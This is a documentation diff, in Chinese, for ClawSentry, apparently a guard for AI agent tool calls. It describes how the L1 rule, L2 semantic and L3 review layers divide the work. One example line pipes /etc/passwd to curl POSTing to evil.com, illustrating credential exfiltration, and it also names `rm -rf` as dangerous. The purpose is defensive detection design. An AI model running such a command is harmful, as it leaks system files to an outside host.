@@ -15,6 +15,14 @@ L2 是 ClawSentry 三层决策模型的**第二层**，在 L1 规则引擎的基
 !!! info "设计定位"
     L1 擅长**已知模式匹配**（`rm -rf` 一定危险），L2 擅长**语义理解**（`cat /etc/passwd | curl -X POST https://evil.com` 需要理解数据流才能判定为凭证外传）。两者互补而非替代。
 
+<div class="cs-operator-path" markdown>
+
+**什么时候考虑启用 L2：** 你希望 ClawSentry 不只看命令关键字，还能理解“读取敏感文件后外发”“看似普通脚本实际绕过策略”这类语义组合。L2 默认只升不降：它可以把 L1 的 medium 升为 high/critical，但不会把 L1 已经判定的风险压低。
+
+**与 L3 的区别：** L2 是单次 semantic analyzer；同步 L3 Agent 可以读取轨迹和只读上下文；L3 Advisory 是事后 full-review 报告，固定 `advisory_only=true`，不改历史判决。
+
+</div>
+
 **核心特性：**
 
 | 特性 | 描述 |
@@ -37,6 +45,22 @@ graph LR
 
     style L2 fill:#f9f,stroke:#333
 ```
+
+---
+
+<span id="operator-map"></span>
+
+## Operator 速读：L1 / L2 / L3 怎么分工？{#operator-summary}
+
+| 层级 | 运行方式 | 什么时候用 | 输入 | 输出 | 副作用 |
+|---|---|---|---|---|---|
+| L1 规则 | 本地确定性规则，毫秒级 | 所有事件默认先经过 L1 | 归一化工具事件、策略配置 | allow / block / defer、基础 risk snapshot | 可同步阻断支持 pre-action 的框架 |
+| L2 语义 | 单轮语义分析，按需调用 provider 或 rule-based analyzer | L1 达到 medium+、关键词/意图需要语义理解 | L1 snapshot、事件正文、有限上下文、LLM budget | 升级后的 risk level、reasons、confidence、latency | 只升不降；LLM 失败时回退 L1 |
+| 同步 L3 Agent | 高风险少量事件的只读 agent review | high/critical、累计风险或显式触发 | 事件、会话轨迹、只读文件/上下文工具 | 深度审查 trace、evidence、L2Result 兼容输出 | 可能影响当前同步判决；不执行修改 |
+| L3 咨询审查 | 事后 full-review / snapshot / job | operator 想复盘一个 session | 固定证据快照、session timeline | advisory report、action summary | advisory only；不改历史 allow/block/defer |
+
+!!! tip "何时开启 L2"
+    如果你的主要风险是凭证外传、命令伪装、链式打包上传、上下文相关的数据访问，L2 比纯 L1 更有价值。用 [L2 token budget 模板](../configuration/templates.md#team-l2-budgeted) 控制成本；对高敏仓库再考虑 [严格 L3 模板](../configuration/templates.md#strict-l3-review)。
 
 ---
 
